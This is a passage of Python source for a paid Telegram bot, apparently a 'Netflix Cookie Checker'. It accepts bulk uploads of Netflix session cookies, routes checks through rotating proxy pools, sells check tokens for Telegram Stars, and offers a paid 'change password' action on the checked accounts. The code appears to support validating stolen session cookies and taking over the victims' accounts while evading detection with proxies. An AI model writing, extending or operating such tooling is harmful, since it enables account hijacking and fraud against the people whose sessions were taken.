        _USER_SESSION.pop(uid, None)

    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ <b>Something went wrong.</b>\n\n"
                "Your session has been reset — please try again.\n"
                "If the problem keeps happening, try /start.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# File & text handlers
# ---------------------------------------------------------------------------

_PROXY_TXT_MAX_BYTES = 2 * 1024 * 1024  # 2 MB — plenty for any proxy list


async def _handle_proxy_txt_upload(update: Update, uid: int, for_admin: bool) -> None:
    """Download a .txt document and import its lines as proxies."""
    doc = update.message.document
    # Guard against oversized uploads before touching the network
    if doc.file_size and doc.file_size > _PROXY_TXT_MAX_BYTES:
        await update.message.reply_text(
            f"⚠️ File too large ({doc.file_size // 1024} KB). "
            f"Max allowed: {_PROXY_TXT_MAX_BYTES // 1024} KB.\n"
            "Split your proxy list into smaller files.",
            parse_mode=ParseMode.HTML,
        )
        return
    prog = await update.message.reply_text("⏳ Downloading proxy list…")
    tmp_path = None
    try:
        tg_file = await doc.get_file()
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
            await tg_file.download_to_drive(tmp.name)
            tmp_path = tmp.name
    except Exception as e:
        await prog.edit_text(f"❌ Download failed: {e}", parse_mode=ParseMode.HTML)
        return
    try:
        with open(tmp_path, "rb") as f:
            raw = f.read(_PROXY_TXT_MAX_BYTES + 1)  # cap read at limit
        try:
            os.unlink(tmp_path)
        except Exception:
            pass
        if _is_binary_content(raw):
            await prog.edit_text(
                "❌ File looks binary — upload a plain <code>.txt</code> file.",
                parse_mode=ParseMode.HTML,
            )
            return
        lines   = raw.decode("utf-8", errors="replace").splitlines()
        proxies = [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]
        if not proxies:
            await prog.edit_text("⚠️ No proxy lines found in the file.", parse_mode=ParseMode.HTML)
            return

        loop = asyncio.get_running_loop()
        if for_admin:
            from proxy_manager import proxy_manager as _pm

            def _do_admin_import():
                _added = _skipped = 0
                _errs: list[str] = []
                for p in proxies:
                    ok, result = _pm.add_proxy_raw(p)
                    if ok:
                        _added += 1
                    else:
                        _skipped += 1
                        if len(_errs) < 3:
                            _errs.append(f"<code>{p[:40]}</code>: {result}")
                return _added, _skipped, _errs, _pm.count

            added, skipped, err_samples, pool_total = await loop.run_in_executor(
                _EXECUTOR, _do_admin_import
            )
            total_note = f"\n📡 Pool total: <b>{pool_total}</b>"
        else:
            def _do_user_import():
                _added = _skipped = 0
                _errs: list[str] = []
                for p in proxies:
                    ok, result = user_store.add_user_proxy(uid, p)
                    if ok:
                        _added += 1
                    else:
                        _skipped += 1
                        if len(_errs) < 3:
                            _errs.append(f"<code>{p[:40]}</code>: {result}")
                return _added, _skipped, _errs, user_store.count_user_proxies(uid)

            added, skipped, err_samples, user_total = await loop.run_in_executor(
                _EXECUTOR, _do_user_import
            )
            total_note = f"\n📡 Your total: <b>{user_total}</b>"

        err_note = ("\n⚠️ Sample errors:\n" + "\n".join(err_samples)) if err_samples else ""
        await prog.edit_text(
            f"✅ <b>Proxy TXT imported!</b>\n\n"
            f"  ➕ Added: <b>{added}</b>\n"
            f"  ⏭ Skipped/invalid: <b>{skipped}</b>"
            f"{total_note}{err_note}",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await prog.edit_text(f"⚠️ Error parsing file: {e}", parse_mode=ParseMode.HTML)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc: Document = update.message.document
    uid = update.effective_user.id if update.effective_user else None
    if uid:
        user_store.register_user(uid)

    # ── Proxy TXT upload intercept (user or admin) ─────────────────────────
    if uid and (uid in _USER_PROXY_FILE_STATE or
                (is_admin(uid) and uid in _PROXY_FILE_STATE)):
        _USER_PROXY_FILE_STATE.discard(uid)
        _PROXY_FILE_STATE.discard(uid)
        fname = (doc.file_name or "").lower()
        if not (fname.endswith(".txt") or (doc.mime_type or "").startswith("text/")):
            await update.message.reply_text(
                "❌ Please upload a <b>.txt</b> file with one proxy per line.\n"
                "Use /myproxy or /proxy to try again.",
                parse_mode=ParseMode.HTML,
            )
            return
        await _handle_proxy_txt_upload(update, uid, for_admin=is_admin(uid))
        return

    # ── Concurrency guard: one active check per user ───────────────────────
    if uid in _ACTIVE_USERS:
        await update.message.reply_text(
            "⏳ <b>You already have a check running.</b>\n"
            "Wait for it to finish or cancel it before starting a new one.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── File size ──────────────────────────────────────────────────────────
    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        await update.message.reply_text(
            "⚠️ <b>File too large.</b> Maximum size is <b>20 MB</b>.\n"
            "Split your cookies into smaller batches.",
            parse_mode=ParseMode.HTML,
        )
        return

    mime = doc.mime_type or ""
    fname = (doc.file_name or "").lower()
    is_zip    = fname.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed")
    is_cookie = any(fname.endswith(ext) for ext in COOKIE_EXTENSIONS) or mime in COOKIE_MIME_TYPES

    # ── Extension / MIME guard ─────────────────────────────────────────────
    if not is_zip and not is_cookie:
        ext = Path(fname).suffix.upper() or "(no extension)"
        await update.message.reply_text(
            f"❌ <b>Unsupported file type: <code>{ext}</code></b>\n\n"
            "Accepted formats:\n"
            "  • <code>.txt</code>  — Netscape cookies or pipe-combo\n"
            "  • <code>.json</code> — JSON cookie export\n"
            "  • <code>.zip</code>  — Multiple cookie files\n\n"
            "<i>Send the actual cookie file, not a screenshot or archive.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    if uid:
        _ACTIVE_USERS[uid] = time.time()

    status_msg = await update.message.reply_text("⏳ Downloading file…")
    suffix  = ".zip" if is_zip else (Path(fname).suffix or ".txt")
    tmp_path = None
    last_error = None

    # ── Download with retry ────────────────────────────────────────────────
    for attempt in range(3):
        try:
            if attempt > 0:
                await asyncio.sleep(2 * attempt)
                await status_msg.edit_text(f"⏳ Retrying download ({attempt + 1}/3)…")
            tg_file = await doc.get_file()
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
                await tg_file.download_to_drive(tmp.name)
                tmp_path = tmp.name
            break
        except Exception as e:
            last_error = e

    if tmp_path is None:
        await status_msg.edit_text(
            f"⚠️ <b>Download failed</b> after 3 attempts.\n"
            f"<i>Error: {last_error}</i>",
            parse_mode=ParseMode.HTML,
        )
        if uid:
            _ACTIVE_USERS.pop(uid, None)
        return

    original_name = doc.file_name or "unknown"

    try:
        if is_zip:
            await status_msg.edit_text("📦 Extracting ZIP…")
            try:
                entries = read_cookie_texts_from_zip(tmp_path)
            except zipfile.BadZipFile:
                await status_msg.edit_text(
                    "❌ <b>Corrupt or invalid ZIP file.</b>\n\n"
                    "The file could not be opened. Make sure it is a valid, unencrypted ZIP archive.",
                    parse_mode=ParseMode.HTML,
                )
                return
            except Exception as _e:
                await status_msg.edit_text(
                    f"❌ <b>ZIP extraction failed.</b>\n<i>{type(_e).__name__}: {_e}</i>",
                    parse_mode=ParseMode.HTML,
                )
                return
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass

            if not entries:
                await status_msg.edit_text(
                    "⚠️ <b>No cookie files found in ZIP.</b>\n\n"
                    "Make sure the ZIP contains <code>.txt</code> or <code>.json</code> cookie files.",
                    parse_mode=ParseMode.HTML,
                )
                return

            # Validate that at least one file in the ZIP has Netflix cookies
            all_text = " ".join(t for _, t in entries)
            if not _has_netflix_markers(all_text):
                wrong = _wrong_service_name(all_text)
                if wrong:
                    msg = (
                        f"❌ <b>Wrong service: {wrong}</b>\n\n"
                        f"This ZIP contains <b>{wrong}</b> cookies, not Netflix.\n"
                        "Only Netflix cookies are supported."
                    )
                else:
                    msg = (
                        "❌ <b>No Netflix cookies found in this ZIP.</b>\n\n"
                        "Required: <code>NetflixId</code> or <code>SecureNetflixId</code> cookies."
                    )
                await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)
                return

            all_sets: list[tuple[str, str, str]] = []
            for entry_fname, text in entries:
                for block in split_cookies_from_text(text):
                    all_sets.append((entry_fname, block, block))

            # ── Routing: determine proxy mode for this user ─────────────────
            _zip_count = max(1, len(all_sets))
            if uid and _has_both_access(uid, _zip_count) and _get_routing_pref(uid) == "ask":
                _ACTIVE_USERS.pop(uid, None)
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                _ROUTING_CHOICE_STATE[uid] = {
                    "kind": "zip", "update": update,
                    "all_sets": all_sets, "count": _zip_count,
                }
                await update.message.reply_text(
                    f"🔀 <b>How should I check {_zip_count} cookie{'s' if _zip_count != 1 else ''}?</b>\n\n"
                    f"You have <b>{user_store.get_balance(uid)} 🪙</b> and your own proxies.\n"
                    "<i>Set a default via /settings → Routing.</i>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=_routing_choice_keyboard(uid, user_store.get_balance(uid)),
                )
                return
            _fd3, _up3, _em3 = await _get_check_params(uid or 0, count=_zip_count)
            if _em3 is not None:
                await status_msg.edit_text(_em3, parse_mode=ParseMode.HTML)
                return
            await process_cookie_sets(update, status_msg, all_sets,
                                      force_direct=_fd3, user_proxies=_up3)

        else:
            # ── Read & validate content before checking ────────────────────
            with open(tmp_path, "rb") as f:
                raw_bytes = f.read()
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

            # Binary file check (images, executables, etc.)
            if _is_binary_content(raw_bytes):
                await status_msg.edit_text(
                    "❌ <b>Binary file detected.</b>\n\n"
                    "This looks like an image, executable, or compressed file — not a cookie file.\n"
                    "Send a plain-text <code>.txt</code> or <code>.json</code> cookie file.",
                    parse_mode=ParseMode.HTML,
                )
                return

            cookie_text = raw_bytes.decode("utf-8", errors="replace")
            ok, err_msg = _validate_cookie_text(cookie_text)
            if not ok:
                await status_msg.edit_text(err_msg, parse_mode=ParseMode.HTML)
                return

            # ── Routing: determine proxy mode for this user ─────────────────
            cookie_count = max(1, len(split_cookies_from_text(cookie_text)))
            if uid and _has_both_access(uid, cookie_count) and _get_routing_pref(uid) == "ask":
                _ACTIVE_USERS.pop(uid, None)
                try:
                    await status_msg.delete()
                except Exception:
                    pass
                _ROUTING_CHOICE_STATE[uid] = {
                    "kind": "cookie", "update": update,
                    "cookie_text": cookie_text, "source": original_name,
                    "count": cookie_count,
                }
                await update.message.reply_text(
                    f"🔀 <b>How should I check {cookie_count} cookie{'s' if cookie_count != 1 else ''}?</b>\n\n"
                    f"You have <b>{user_store.get_balance(uid)} 🪙</b> and your own proxies.\n"
                    "<i>Set a default via /settings → Routing.</i>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=_routing_choice_keyboard(uid, user_store.get_balance(uid)),
                )
                return
            _fd2, _up2, _em2 = await _get_check_params(uid or 0, count=cookie_count)
            if _em2 is not None:
                await status_msg.edit_text(_em2, parse_mode=ParseMode.HTML)
                return
            await process_cookies(update, status_msg, cookie_text, source=original_name,
                                  force_direct=_fd2, user_proxies=_up2)

    except Exception as e:
        logger.exception("Error processing document from user %s", uid)
        try:
            if tmp_path:
                os.unlink(tmp_path)
        except Exception:
            pass
        try:
            await status_msg.edit_text(
                f"⚠️ <b>Processing error</b>\n<i>{type(e).__name__}: {e}</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel any active interactive flow (e.g. /changepw, proxy add, /setqr)."""
    uid = update.effective_user.id if update.effective_user else 0
    if uid in _CHANGEPW_STATE:
        cancelled_state = _CHANGEPW_STATE.pop(uid, None)
        refund_msg = ""
        if cancelled_state and cancelled_state.get("tokens_deducted") and not is_admin(uid):
            refund = _TOKEN_COSTS.get("changepw", 5)
            user_store.add_tokens(uid, refund, reason="changepw_refund_cancel")
            refund_msg = f"\n🪙 <b>{refund} tokens refunded</b> to your balance."
        await update.message.reply_text(
            f"❌ <b>Change Password cancelled.</b>{refund_msg}",
            parse_mode=ParseMode.HTML,
        )
        return
    if uid in _BROADCAST_PENDING:
        _BROADCAST_PENDING.discard(uid)
        await update.message.reply_text("❌ Broadcast cancelled.")
        return
    if uid in _SETQR_STATE:
        _SETQR_STATE.discard(uid)
        await update.message.reply_text("❌ SetQR cancelled.")
        return
    if uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        await update.message.reply_text("❌ Proxy add cancelled.")
        return
    if uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        await update.message.reply_text("❌ Import cancelled.")
        return
    if uid in _USER_PROXY_ADD_STATE:
        _USER_PROXY_ADD_STATE.discard(uid)
        await update.message.reply_text("❌ Proxy add cancelled.")
        return
    if uid in _USER_PROXY_URL_STATE:
        _USER_PROXY_URL_STATE.discard(uid)
        await update.message.reply_text("❌ URL import cancelled.")
        return
    if uid in _USER_PROXY_FILE_STATE:
        _USER_PROXY_FILE_STATE.discard(uid)
        await update.message.reply_text("❌ Proxy file upload cancelled.")
        return
    if uid in _PROXY_FILE_STATE:
        _PROXY_FILE_STATE.discard(uid)
        await update.message.reply_text("❌ Proxy file upload cancelled.")
        return
    if uid in _ROUTING_CHOICE_STATE:
        _ROUTING_CHOICE_STATE.pop(uid, None)
        await update.message.reply_text("❌ Check cancelled.")
        return
    await update.message.reply_text("Nothing to cancel.")


async def setadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Claim admin role (one-time, first caller wins)."""
    global _ADMIN_ID
    uid = update.effective_user.id if update.effective_user else None
    if uid is None:
        return
    if _ADMIN_ID is not None:
        if uid == _ADMIN_ID:
            await update.message.reply_text("✅ You are already the admin.")
        else:
            await update.message.reply_text("⛔ Admin is already set.")
        return
    _ADMIN_ID = uid
    _save_admin_id(uid)
    await update.message.reply_text(
        "✅ <b>You are now the bot admin.</b>\n\n"
        "Use /proxy to manage the proxy pool.",
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Per-user check routing
# ---------------------------------------------------------------------------

def _has_both_access(uid: int, count: int) -> bool:
    """True when user has ≥count tokens AND at least one own proxy (routing choice is meaningful)."""
    if is_admin(uid):
        return False
    return (user_store.get_balance(uid) >= count and
            bool(user_store.list_user_proxies(uid)))


def _routing_choice_keyboard(uid: int, balance: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(f"🪙 Use Tokens ({balance} left)", callback_data=f"routechoice:{uid}:tokens"),
        InlineKeyboardButton("📡 Use My Proxies",               callback_data=f"routechoice:{uid}:proxies"),
    ]])


async def _get_check_params(uid: int, count: int = 1, force_use: str | None = None) -> tuple[bool, list | None, str | None]:
    """
    Decide how this user's cookie check should run.
    Returns (force_direct, user_proxies_list, error_msg_or_None).
    count      = number of cookies — used to validate/deduct token balance.
    force_use  = "tokens" | "proxies" | None (None = auto-pick by pref/availability).
    error_msg_or_None = None means OK to proceed.
    """
    from proxy_manager import proxy_manager as _pm

    # Admin: free, always use direct or pool
    if is_admin(uid):
        if _pm.admin_direct:
            return True, None, None
        return False, None, None

    balance = user_store.get_balance(uid)
    proxies = user_store.list_user_proxies(uid)
    has_tokens  = balance >= count
    has_proxies = bool(proxies)
    pref = _get_routing_pref(uid)

    # Forced choice (from routing choice callback)
    if force_use == "proxies":
        if proxies:
            return False, proxies, None
        force_use = "tokens"  # fallback if proxies disappeared

    if force_use == "tokens":
        if has_tokens:
            ok, _ = user_store.deduct_tokens(uid, count, reason=f"check×{count}")
            if ok:
                return False, None, None
        # Tokens unexpectedly insufficient — fall through to proxy or error
        if has_proxies:
            return False, proxies, None

    # Preference-driven auto-pick (no forced choice)
    if pref == "proxies" and has_proxies:
        return False, proxies, None

    if pref == "tokens" and has_tokens:
        ok, _ = user_store.deduct_tokens(uid, count, reason=f"check×{count}")
        if ok:
            return False, None, None

    if pref == "ask":
        # Both available → caller should show choice keyboard (checked before calling us)
        # If only one available, pick it
        if has_tokens and not has_proxies:
            ok, _ = user_store.deduct_tokens(uid, count, reason=f"check×{count}")
            if ok:
                return False, None, None
        if has_proxies and not has_tokens:
            return False, proxies, None

    # Default: tokens first, then proxies
    if has_tokens:
        ok, _ = user_store.deduct_tokens(uid, count, reason=f"check×{count}")
        if ok:
            return False, None, None
    if has_proxies:
        return False, proxies, None

    # No access
    need_s = "token" if count == 1 else "tokens"
    return False, None, (
        f"🔒 <b>Access Required</b>\n\n"
        f"You need <b>{count} {need_s}</b> to check {count} cookie{'s' if count > 1 else ''}.\n"
        f"Your balance: <b>{balance} 🪙</b>\n\n"
        "💰 /buy — Get tokens\n"
        "🔧 /myproxy — Add your own proxy (free)\n"
        "👤 /account — View balance"
    )


# ---------------------------------------------------------------------------
# User proxy management panel
# ---------------------------------------------------------------------------

def _user_proxy_panel_text(uid: int) -> str:
    proxies = user_store.list_user_proxies(uid)
    balance = user_store.get_balance(uid)
    lines   = ["🔧 <b>My Proxy Settings</b>", ""]

    if balance > 0:
        lines.append(f"🪙 <b>Balance: {balance} tokens</b>  — admin pool access active")
    else:
        lines.append("🪙 <b>Balance: 0 tokens</b>")
        lines.append("<i>Add your own proxy, or /buy tokens to use our pool.</i>")

    lines.append("")

    if proxies:
        lines.append(f"📡 <b>Your Proxies: {len(proxies)}</b>  <i>(tap Download to view the list)</i>")
    else:
        lines.append("<i>No personal proxies added.</i>")

    return "\n".join(lines)


def _user_proxy_panel_markup(uid: int) -> InlineKeyboardMarkup:
    proxies = user_store.list_user_proxies(uid)
    rows = []
    rows.append([
        InlineKeyboardButton("➕ Add Proxy",       callback_data="uproxy:add"),
        InlineKeyboardButton("📂 Upload TXT",      callback_data="uproxy:uploadtxt"),
    ])
    rows.append([
        InlineKeyboardButton("📥 Import from URL", callback_data="uproxy:importurl"),
        InlineKeyboardButton("🔄 Refresh",         callback_data="uproxy:refresh"),
    ])
    if proxies:
        rows.append([
            InlineKeyboardButton("📄 Download List",   callback_data="uproxy:downloadlist"),
            InlineKeyboardButton("🗑 Delete a Proxy",  callback_data="uproxy:delselect"),
        ])
        rows.append([
            InlineKeyboardButton("💣 Clear All",       callback_data="uproxy:clearall"),
        ])
    rows.append([InlineKeyboardButton("💫 Get Premium (/buy)", callback_data="uproxy:buy")])
    return InlineKeyboardMarkup(rows)


def _user_proxy_del_markup(uid: int) -> InlineKeyboardMarkup:
    proxies = user_store.list_user_proxies(uid)
    rows = []
    for i, p in enumerate(proxies):
        short = p[:42] + "…" if len(p) > 42 else p
        rows.append([InlineKeyboardButton(
            f"🗑 {i+1}. {short}", callback_data=f"uproxy:del:{i}"
        )])
    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="uproxy:refresh")])
    return InlineKeyboardMarkup(rows)


async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if is_admin(uid):
        await update.message.reply_text(
            "👑 <b>You are the admin.</b>\n\n"
            "The <b>/myproxy</b> panel is for regular users to manage their personal proxies.\n\n"
            "Your tools:\n"
            "  /proxy — manage the admin proxy pool\n"
            "  /adminpanel — admin dashboard &amp; direct mode toggle",
            parse_mode=ParseMode.HTML,
        )
        return
    await update.message.reply_text(
        _user_proxy_panel_text(uid),
        parse_mode=ParseMode.HTML,
        reply_markup=_user_proxy_panel_markup(uid),
    )


async def userproxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    uid   = query.from_user.id if query.from_user else 0
    await query.answer()
    action = query.data

    if action == "uproxy:add":
        _USER_PROXY_ADD_STATE.add(uid)
        await query.message.reply_text(
            "📝 <b>Send your proxy:</b>\n\n"
            "Accepted formats:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>  ← Webshare style\n"
            "  • <code>user:pass@host:port</code>\n"
            "  • <code>http://user:pass@host:port</code>\n"
            "  • <code>socks5://host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "uproxy:delselect":
        proxies = user_store.list_user_proxies(uid)
        if not proxies:
            await query.answer("No proxies to delete.", show_alert=True)
            return
        await query.message.reply_text(
            "🗑 <b>Select a proxy to delete:</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=_user_proxy_del_markup(uid),
        )
        return

    elif action.startswith("uproxy:del:"):
        try:
            idx = int(action.split(":")[2])
        except (ValueError, IndexError):
            return
        removed = user_store.remove_user_proxy(uid, idx)
        if removed:
            short = removed[:55] + "…" if len(removed) > 55 else removed
            await query.answer(f"Removed: {short}", show_alert=False)
        else:
            await query.answer("Proxy not found.", show_alert=True)

    elif action == "uproxy:clearall":
        n = user_store.clear_user_proxies(uid)
        await query.answer(f"Cleared {n} proxy(ies).", show_alert=False)

    elif action == "uproxy:uploadtxt":
        _USER_PROXY_FILE_STATE.add(uid)
        await query.message.reply_text(
            "📂 <b>Upload a proxy list (.txt file):</b>\n\n"
            "Send a plain-text <code>.txt</code> file — one proxy per line.\n\n"
            "Accepted formats:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>\n"
            "  • <code>user:pass@host:port</code>\n"
            "  • <code>http://user:pass@host:port</code>\n"
            "  • <code>socks5://host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "uproxy:importurl":
        _USER_PROXY_URL_STATE.add(uid)
        await query.message.reply_text(
            "🌐 <b>Send the URL to import proxies from:</b>\n\n"
            "The URL must return a plain-text list — one proxy per line.\n\n"
            "Example formats in the list:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>\n"
            "  • <code>http://user:pass@host:port</code>\n\n"
            "Up to 50 proxies will be imported per URL.\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "uproxy:buy":
        try:
            await query.message.delete()
        except Exception:
            pass
        await _send_buy_menu(query.message.chat_id, context)
        return

    elif action == "uproxy:downloadlist":
        proxies = user_store.list_user_proxies(uid)
        if not proxies:
            await query.answer("No proxies to download.", show_alert=True)
            return
        content = "\n".join(proxies).encode("utf-8")
        await query.message.reply_document(
            document=io.BytesIO(content),
            filename="my_proxies.txt",
            caption=f"📄 <b>{len(proxies)} proxies</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "uproxy:refresh":
        pass

    try:
        await query.message.edit_text(
            _user_proxy_panel_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_user_proxy_panel_markup(uid),
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Token purchase — /buy
# ---------------------------------------------------------------------------

async def _send_buy_menu(chat_id: int, context: ContextTypes.DEFAULT_TYPE) -> None:
    lines = [
        "🪙 <b>Buy Tokens</b>",
        "",
        "Tokens power all premium features:",
        "  • 1 token = 1 cookie check (admin pool)",
        "  • 5 tokens = change password",
        "",
        "<b>Packs — pay with ⭐ Stars:</b>",
    ]
    kb_rows = []
    for key, pack in _TOKEN_PACKS.items():
        bonus_str = f"  <i>{pack['bonus']}</i>" if pack.get("bonus") else ""
        lines.append(
            f"  {pack['emoji']} <b>{pack['label']}</b> — <b>{pack['stars']} ⭐</b>{bonus_str}"
        )
        label_btn = f"{pack['emoji']} {pack['tokens']} tokens — {pack['stars']} ⭐"
        if pack.get("bonus"):
            label_btn += f"  ({pack['bonus']})"
        kb_rows.append([InlineKeyboardButton(label_btn, callback_data=f"buy:{key}")])

    # External payment option
    qr_file_id = user_store.get_config("payment_qr_file_id")
    if qr_file_id:
        kb_rows.append([InlineKeyboardButton("📲 Pay Externally (QR)", callback_data="buy:qr")])

    lines += ["", "<i>Stars payment is instant. External payments credited manually by admin.</i>"]
    await context.bot.send_message(
        chat_id=chat_id,
        text="\n".join(lines),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb_rows),
    )


async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    balance = user_store.get_balance(uid)
    if balance > 0:
        await update.message.reply_text(
            f"🪙 <b>Your balance: {balance} tokens</b>\n\n"
            "You can buy more tokens below — they stack on your balance.",
            parse_mode=ParseMode.HTML,
        )
    await _send_buy_menu(update.effective_chat.id, context)


async def buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    uid   = query.from_user.id if query.from_user else 0
    await query.answer()
    action = query.data

    if not action.startswith("buy:"):
        return

    pack_key = action[4:]

    # External QR payment
    if pack_key == "qr":
        qr_file_id = user_store.get_config("payment_qr_file_id")
        if not qr_file_id:
            await query.answer("No external payment QR configured.", show_alert=True)
            return
        try:
            _admin_contact = (
                f"Message <b>{PAYMENT_ADMIN_USERNAME}</b>"
                if PAYMENT_ADMIN_USERNAME else "Message the admin"
            )
            await context.bot.send_photo(
                chat_id=uid,
                photo=qr_file_id,
                caption=(
                    "📲 <b>External Payment</b>\n\n"
                    "Scan the QR to pay.\n\n"
                    f"After payment, {_admin_contact} with your payment proof "
                    "and they will credit your token balance manually.\n\n"
                    "👤 Use /account to check your balance."
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            await query.answer(f"Error: {e}", show_alert=True)
        return

    pack = _TOKEN_PACKS.get(pack_key)
    if not pack:
        await query.answer("Unknown pack.", show_alert=True)
        return

    try:
        await context.bot.send_invoice(
            chat_id=uid,
            title=f"Netflix Checker — {pack['label']}",
            description=(
                f"{pack['emoji']} {pack['tokens']} tokens for Netflix Cookie Checker.\n"
                "Use admin proxy pool — 1 token per check."
            ),
            payload=f"tokens_{pack_key}",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(pack["label"], pack["stars"])],
        )
        try:
            await query.message.delete()
        except Exception:
            pass
    except Exception as e:
        await query.message.reply_text(
            f"⚠️ Could not create invoice: {e}",
            parse_mode=ParseMode.HTML,
        )


async def precheckout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.pre_checkout_query
    payload = query.invoice_payload
    valid_keys = {f"tokens_{k}" for k in _TOKEN_PACKS}
    if payload in valid_keys:
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="Unknown payment. Contact admin.")


async def successful_payment_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    payment = update.message.successful_payment
    uid     = update.effective_user.id
    payload = payment.invoice_payload
    stars   = payment.total_amount

    # ── Token pack purchase ───────────────────────────────────────────────
    if payload.startswith("tokens_"):
        pack_key = payload[7:]
        pack = _TOKEN_PACKS.get(pack_key)
        if not pack:
            logger.warning("successful_payment: unknown token pack %s uid=%s", pack_key, uid)
            await update.message.reply_text(
                "⚠️ Payment received but pack not found. Contact admin.",
                parse_mode=ParseMode.HTML,
            )
            return
        if stars != pack["stars"]:
            logger.error(
                "token pack payment MISMATCH: got %s stars, expected %s, uid=%s — NOT crediting",
                stars, pack["stars"], uid,
            )
            await update.message.reply_text(
                "⚠️ <b>Payment amount mismatch.</b>\n\n"
                f"Expected <b>{pack['stars']} ⭐</b>, received <b>{stars} ⭐</b>.\n"
                "Tokens have <b>not</b> been credited. Please contact the admin to resolve.",
                parse_mode=ParseMode.HTML,
            )
            if _ADMIN_ID:
                try:
                    await context.bot.send_message(
                        chat_id=_ADMIN_ID,
                        text=(
                            f"⚠️ <b>Payment mismatch</b>\n"
                            f"User: <code>{uid}</code>\n"
                            f"Pack: <code>{pack_key}</code> (expected {pack['stars']} ⭐)\n"
                            f"Received: <b>{stars} ⭐</b>\n"
                            "Tokens NOT credited — manual review required."
                        ),
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass
            return
        new_bal = user_store.add_tokens(uid, pack["tokens"], reason=f"stars_{pack_key}")
        await update.message.reply_text(
            f"✅ <b>Payment Successful!</b>\n\n"
            f"  {pack['emoji']} Pack: <b>{pack['label']}</b>\n"
            f"  ⭐ Stars paid: <b>{stars}</b>\n"
            f"  🪙 Tokens added: <b>{pack['tokens']}</b>\n"
            f"  💰 New balance: <b>{new_bal} tokens</b>\n\n"
            "Send me any Netflix cookie to check it — 1 token per check.\n"
            "👤 /account — View your balance",
            parse_mode=ParseMode.HTML,
        )
        if _BACKUP_CHAT_ID:
            try:
                await _send_backup(context)
            except Exception:
                pass
        return

    logger.warning("successful_payment: unknown payload %s uid=%s", payload, uid)


# ---------------------------------------------------------------------------
# Telegram backup helpers
# ---------------------------------------------------------------------------

async def _send_backup(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a JSON backup of all user data to BACKUP_CHAT_ID."""
    if not _BACKUP_CHAT_ID:
        return
    data = user_store.export_json()
    buf  = io.BytesIO(data.encode("utf-8"))
    buf.name = f"backup_{int(time.time())}.json"
    await context.bot.send_document(
        chat_id=_BACKUP_CHAT_ID,
        document=buf,
        filename=buf.name,
        caption=f"🗄 Auto-backup — {time.strftime('%Y-%m-%d %H:%M UTC')}",
    )


# ---------------------------------------------------------------------------
# Account — /account (all users, including admin)
# ---------------------------------------------------------------------------

async def _send_account(chat_id: int, uid: int, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send the account profile card to chat_id for user uid."""
    stats   = user_store.get_token_stats(uid)
    proxies = user_store.count_user_proxies(uid)
    txns    = user_store.get_recent_transactions(uid, limit=3)

    if is_admin(uid):
        token_users  = user_store.get_all_balances()
        holders      = [u for u in token_users if u["balance"] > 0]
        from proxy_manager import proxy_manager as _pm
        pool_count   = _pm.count
        lines = [
            "👑 <b>Admin Account</b>",
            "",
            f"🆔 ID: <code>{uid}</code>",
            f"🪙 Balance: <b>∞</b>  <i>(admin — free access)</i>",
            "",
            "📊 <b>Bot Overview</b>",
            f"  👥 Users with tokens: <b>{len(holders)}</b>",
            f"  📊 All tracked users: <b>{len(token_users)}</b>",
